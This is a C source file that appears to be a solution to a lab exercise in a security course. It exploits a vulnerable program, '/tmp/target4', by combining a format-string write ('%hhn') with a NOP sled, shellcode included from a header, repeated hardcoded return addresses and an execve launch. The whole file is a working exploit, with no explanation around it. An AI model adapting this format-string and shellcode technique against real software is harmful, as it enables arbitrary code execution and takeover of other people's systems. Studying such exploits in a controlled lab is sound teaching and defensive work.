#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define NOP 0x90
#define ADDR_DIF 268
#define SHELL_CODE_DIF 180

// Return goes through eax register

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[250]; 
  char ourstr[300] = "\xc8\xfb\xff\xbf%08x%08x%08x%hhn%150u";
 /* 
  int ourstrfilled = 0;
  int elongators = 21;

  int i, j;
  for(i = 0; i < elongators; i++) {
    for(j = 0; j < 4; j++) { 
      //ourstr[ourstrfilled++] = '.';
    }
  }

  ourstr[ourstrfilled++] = '\xa8';
  ourstr[ourstrfilled++] = '\xfb';
  ourstr[ourstrfilled++] = '\xff';
  ourstr[ourstrfilled++] = '\xbf';
  // \x67\xfd\xff\xbf

  for(i = 0; i < 3; i++) {
    ourstr[ourstrfilled++] = '%';
    ourstr[ourstrfilled++] = '0';
    ourstr[ourstrfilled++] = '8';
    ourstr[ourstrfilled++] = 'x';
  }

  ourstr[ourstrfilled++] = '%';
  ourstr[ourstrfilled++] = 'h';
  ourstr[ourstrfilled++] = 'h';
  ourstr[ourstrfilled++] = 'n';

  ourstr[ourstrfilled] = '\0';
*/
  int i;
  for(i = 0; i < sizeof(buf); i++) {
    buf[i] = NOP;
  }

  strncpy(buf, ourstr, strlen(ourstr));
  strncpy(buf + sizeof(buf) - 48 - 30, shellcode, strlen(shellcode));

  
  long *addr_ptr = (long*)(buf + sizeof(buf) - 48 - 31 - 6 * 4);
  long addr = 0xbffffd28;
  *(addr_ptr++) = addr;
  *(addr_ptr++) = addr;
  *(addr_ptr++) = addr;
  *(addr_ptr++) = addr;
  *(addr_ptr++) = addr;
  
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
